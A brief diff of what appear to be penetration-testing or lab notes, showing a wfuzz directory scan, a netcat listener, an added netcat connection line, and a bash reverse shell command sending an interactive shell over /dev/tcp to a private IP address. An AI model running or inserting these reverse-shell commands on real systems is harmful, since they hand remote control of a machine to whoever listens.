@@ -8,6 +8,7 @@ $ wfuzz --hc 404 -c -w /usr/share/wordlists/wfuzz/general/common.txt http://192.
 
 
 nc -nvlp 1234
+nc 192.168.49.128 1234
 
 /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.15/1234 0>&1'
 
